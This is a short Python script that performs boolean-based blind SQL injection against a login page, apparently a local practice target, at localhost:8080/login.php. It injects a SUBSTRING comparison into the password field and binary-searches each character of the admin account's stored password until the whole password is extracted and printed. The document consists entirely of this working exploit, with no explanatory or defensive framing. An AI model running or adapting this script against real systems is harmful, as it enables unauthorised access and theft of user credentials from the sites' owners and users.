import requests

def is_success(r):
  return 'login success' in r.text

print("scanning...")

msg = ""
idx = 1
while True:
  head = 0x00
  tail = 0x7f
  while tail - head > 0:
    mid = (head + tail) // 2

    payload = {
      'id':       'admin',
      'password': f"' OR SUBSTRING((SELECT password FROM users WHERE username='admin'), {idx}, 1) <= binary '{chr(mid)}'-- "
    }
    r = requests.post('http://localhost:8080/login.php', data=payload)

    if is_success(r):
      tail = mid
    else:
      head = mid + 1

  c = chr(head)
  print(c, end='', flush=True)

  if (c == '\0'):
    break

  msg += c
  idx += 1

print('\n')
print(f"message: {msg}")